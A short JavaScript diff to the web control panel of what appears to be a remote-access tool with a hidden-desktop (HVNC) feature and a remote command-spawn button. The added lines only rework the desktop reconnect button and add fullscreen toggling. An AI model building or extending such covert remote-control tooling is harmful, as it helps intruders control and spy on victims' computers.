@@ -309,5 +309,23 @@ document.getElementById("hvnc-spawn-go").addEventListener("click", () => {
   rdSocket.send(JSON.stringify({ t: "spawn", cmd: value }));
 });
 
-document.getElementById("rd-connect").addEventListener("click", connectDesktop);
+document.getElementById("rd-connect").addEventListener("click", async () => {
+  // force a fresh mirror stream (drops a running HVNC/desktop helper)
+  try { if (rdSocket) { rdSocket.onclose = null; rdSocket.close(); rdSocket = null; } } catch (err) {}
+  await connectDesktop();
+});
+
+function toggleFullscreen() {
+  const canvas = document.getElementById("rd-canvas");
+  if (document.fullscreenElement) {
+    document.exitFullscreen().catch(() => {});
+  } else if (canvas && canvas.requestFullscreen) {
+    canvas.requestFullscreen().catch(() => {});
+  }
+}
+const fullBtn = document.getElementById("rd-full");
+if (fullBtn) fullBtn.addEventListener("click", toggleFullscreen);
+const rdCanvasEl = document.getElementById("rd-canvas");
+if (rdCanvasEl) rdCanvasEl.addEventListener("dblclick", toggleFullscreen);
+
 show("desktop");
